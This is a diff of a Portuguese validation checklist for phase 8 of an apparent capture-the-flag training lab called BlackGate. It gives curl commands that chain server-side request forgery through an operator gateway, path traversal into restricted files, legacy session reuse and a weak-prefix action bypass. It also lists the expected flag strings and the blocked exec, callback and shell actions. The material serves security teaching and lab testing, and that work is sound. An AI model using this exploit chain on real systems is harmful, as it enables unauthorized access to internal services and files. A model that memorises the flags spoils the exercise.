@@ -1,4 +1,4 @@
-# Validacao - Lab 05 BlackGate - Fase 7
+# Validacao - Lab 05 BlackGate - Fase 8
 
 ## Escopo
 
@@ -36,10 +36,10 @@ curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
 
 Resultado esperado:
 
-- `/health` retorna `1.6.0-phase7`;
-- `/api/version` retorna build `bg-phase7-report-workflow`;
-- client-config nao contem flag, credencial ou endpoint interno de reports;
-- `/api/routes` nao lista rotas internas de reports;
+- `/health` retorna `1.7.0-phase8`;
+- `/api/version` retorna build `bg-phase8-worker-processing`;
+- client-config nao contem flag, payload ou endpoint interno de worker;
+- `/api/routes` nao lista rotas internas de reports ou worker;
 - debug nao entrega endpoint final nem combinacao.
 
 ## Login e token operator
@@ -101,39 +101,39 @@ Resultado esperado:
 FLAG{blackgate_files_vault_controlled_read_phase5}
 ```
 
-## Ler arquivos novos do Files Vault
+## Arquivos novos do Files Vault
 
 ```bash
-REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/report-workflow-notes.txt"))')
-QUEUE_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/queue-review.txt"))')
-TEMPLATE_ARCHIVE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/template-archive.txt"))')
+WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/worker-review.txt"))')
+DIAG_ACTIONS=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/diagnostics-actions.txt"))')
+PROCESSOR_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/processor-notes.txt"))')
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORT_NOTES"
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_REVIEW"
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE_REVIEW"
+  "http://localhost:8096/api/operator/gateway-fetch?url=$DIAG_ACTIONS"
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATE_ARCHIVE"
+  "http://localhost:8096/api/operator/gateway-fetch?url=$PROCESSOR_NOTES"
 ```
 
 Resultado esperado:
 
 - leitura funciona via bypass controlado `/public/../restricted/...`;
-- nenhuma resposta contem a flag da Fase 7.
+- nenhuma resposta contem a flag da Fase 8.
 
 ## Path direto deve falhar
 
 ```bash
-DIRECT_REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/report-workflow-notes.txt"))')
+DIRECT_WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/worker-review.txt"))')
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_REPORT_NOTES"
+  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_WORKER_REVIEW"
 ```
 
 Resultado esperado:
@@ -171,211 +171,6 @@ Resultado esperado:
 FLAG{blackgate_legacy_credential_reuse_phase6}
 ```
 
-Tambem deve conter:
-
-```text
-Maintenance reports queue jobs for asynchronous processing.
-```
-
-## Reports sem sessao deve falhar
-
-```bash
-REPORTS_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS_NO_SESSION"
-```
-
-Resultado esperado:
-
-- HTTP 401;
-- `legacy_session_required`.
-
-## Reports com sessao
-
-```bash
-REPORTS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports?session=bg6-legacy-session-migration"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS"
-```
-
-Resultado esperado:
-
-- `module: reports`;
-- `status: partial`;
-- `available_actions` contem `templates`, `preview` e `create`;
-- sem flag.
-
-## Templates
-
-```bash
-TEMPLATES=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES"
-```
-
-Resultado esperado:
-
-- lista `daily-summary`, `asset-inventory`, `migration-check`;
-- nao lista `worker-diagnostics`.
-
-```bash
-TEMPLATES_ARCHIVED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=archived"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ARCHIVED"
-```
-
-Resultado esperado:
-
-- inclui `security-audit`;
-- inclui referencia parcial a `worker-diagnostics`;
-- sem flag.
-
-```bash
-TEMPLATES_ALL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=all&audit=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ALL"
-```
-
-Resultado esperado:
-
-- inclui `worker-diagnostics`;
-- sem flag.
-
-## Preview
-
-```bash
-PREVIEW_OK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_OK"
-```
-
-Resultado esperado:
-
-- HTTP 200;
-- `rendered: true`;
-- sem flag.
-
-```bash
-PREVIEW_WORKER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_WORKER"
-```
-
-Resultado esperado:
-
-- HTTP 202;
-- `Template requires queue validation before rendering.`;
-- sem flag.
-
-## Jobs decoy
-
-Template comum:
-
-```bash
-CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
-```
-
-Resultado esperado:
-
-- HTTP 202;
-- `created: true`;
-- sem flag.
-
-Template desabilitado:
-
-```bash
-CREATE_DISABLED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=security-audit&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_DISABLED"
-```
-
-Resultado esperado:
-
-- HTTP 403;
-- `template_disabled`.
-
-Worker diagnostics com scope summary:
-
-```bash
-CREATE_SUMMARY=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary&queue=maintenance-worker&mode=queue-only"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_SUMMARY"
-```
-
-Resultado esperado:
-
-- HTTP 202;
-- `preview-only`;
-- sem flag.
-
-Worker diagnostics com queue errada:
-
-```bash
-CREATE_WRONG_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=migration-report-queue&mode=queue-only"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_WRONG_QUEUE"
-```
-
-Resultado esperado:
-
-- HTTP 202;
-- job aceito na fila errada;
-- sem flag.
-
-Worker diagnostics com render sincrono:
-
-```bash
-CREATE_RENDER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=render"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_RENDER"
-```
-
-Resultado esperado:
-
-- HTTP 403;
-- `synchronous_render_disabled`.
-
-Worker diagnostics com HTML:
-
-```bash
-CREATE_HTML=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=html&scope=internal&queue=maintenance-worker&mode=queue-only"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_HTML"
-```
-
-Resultado esperado:
-
-- HTTP 415;
-- `unsupported_format`.
-
 ## Criar job correto da Fase 7
 
 ```bash
@@ -399,25 +194,25 @@ Tambem deve retornar:
 - `status: queued`;
 - `risk: unsafe-template-accepted`.
 
-## Jobs, queue e worker status
+## Decoy migration-check ainda sem flag
 
 ```bash
-JOBS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs?session=bg6-legacy-session-migration"))')
-JOB_DETAIL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')
-QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/queue?session=bg6-legacy-session-migration"))')
-WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/worker-status?session=bg6-legacy-session-migration"))')
+CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$JOBS"
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
+```
 
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$JOB_DETAIL"
+Resultado esperado:
 
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE"
+- `created: true`;
+- sem flag da Fase 7 ou Fase 8.
+
+## Worker status
+
+```bash
+WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/status?session=bg6-legacy-session-migration"))')
 
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
@@ -426,10 +221,153 @@ curl -i -b /tmp/bg-cookie.txt \
 
 Resultado esperado:
 
-- job correto aparece como `queued`;
-- worker aparece como `paused`;
-- bloqueios incluem `synchronous execution`, `external callbacks` e `shell execution`;
-- detalhes do job nao executam comando e nao retornam output.
+- `worker: maintenance-worker`;
+- `status: paused`;
+- `mode: migration-review`;
+- sem flag.
+
+## Worker queue
+
+```bash
+WORKER_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/queue?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_QUEUE"
+```
+
+Resultado esperado:
+
+- `queue: maintenance-worker`;
+- job `bg7-job-worker-diagnostics`;
+- `processor: maintenance-worker`;
+- sem flag.
+
+## Worker job details
+
+```bash
+WORKER_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_JOB"
+```
+
+Resultado esperado:
+
+- `allowed_actions` contem `status`, `checksum`, `trace`;
+- `blocked_actions` contem `exec`, `callback`, `shell`;
+- sem flag.
+
+## Worker diagnostics
+
+```bash
+WORKER_DIAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG"
+```
+
+Resultado esperado:
+
+- `profile: migration-safe`;
+- actions basicas;
+- sem flag.
+
+```bash
+WORKER_DIAG_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&profile=internal"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG_INTERNAL"
+```
+
+Resultado esperado:
+
+- HTTP 403;
+- `profile_restricted`.
+
+## Decoy normal action
+
+```bash
+WORKER_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace&review=1"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE"
+```
+
+Resultado esperado:
+
+- HTTP 200;
+- `processed: true`;
+- sem flag.
+
+## Decoys e bloqueios
+
+```bash
+WORKER_STATUS_ACTION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=status&review=1"))')
+WORKER_CHECKSUM=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=checksum&review=1"))')
+WORKER_TRACE_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal&review=1"))')
+WORKER_NO_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue"))')
+WORKER_BLOCK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=exec&review=1"))')
+WORKER_BAD_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-migration-check-migration-report-queue&action=trace&review=1"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS_ACTION"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_CHECKSUM"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE_INTERNAL"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_NO_REVIEW"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BLOCK"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BAD_JOB"
+```
+
+Resultados esperados:
+
+- `status` e `checksum` sem flag;
+- `trace:internal` retorna `review_only`;
+- sem `review=1` retorna `review_required`;
+- `exec` retorna `blocked_action`;
+- job errado retorna `job_not_eligible` ou `job_not_found`.
+
+## Flag da Fase 8
+
+```bash
+WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
+```
+
+Resultado esperado:
+
+```text
+FLAG{blackgate_worker_processing_abuse_phase8}
+```
+
+Tambem deve retornar:
+
+- `processed: true`;
+- `finding: worker diagnostics action accepted internal queue trace through weak prefix validation`;
+- next hint para a fase final.
 
 ## Rotas autenticadas no navegador
 
@@ -451,14 +389,15 @@ Apos login, validar:
 
 ```bash
 grep -R "809[0-5]" -n . --exclude-dir=node_modules --exclude-dir=.git || true
-grep -R "FLAG{blackgate_report_workflow_abuse_phase7}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
-grep -R "worker-diagnostics.*maintenance-worker.*queue-only" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
-grep -R "/reports/create" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
+grep -R "FLAG{blackgate_worker_processing_abuse_phase8}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
+grep -R "trace:internal:queue" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
+grep -R "/worker/process" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
+grep -R "/worker" -n src/routes/api.js src/routes/debug.js src/routes/operator.js src/public src/views README.md STUDENT-GUIDE.md || true
 ```
 
 Resultado esperado:
 
 - nenhuma ocorrencia de porta antiga;
-- flag da Fase 7 nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
-- combinacao final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
-- endpoint sensivel de reports nao aparece nas superficies publicas.
+- flag da Fase 8 nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
+- acao final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
+- endpoint sensivel de worker nao aparece nas superficies publicas.
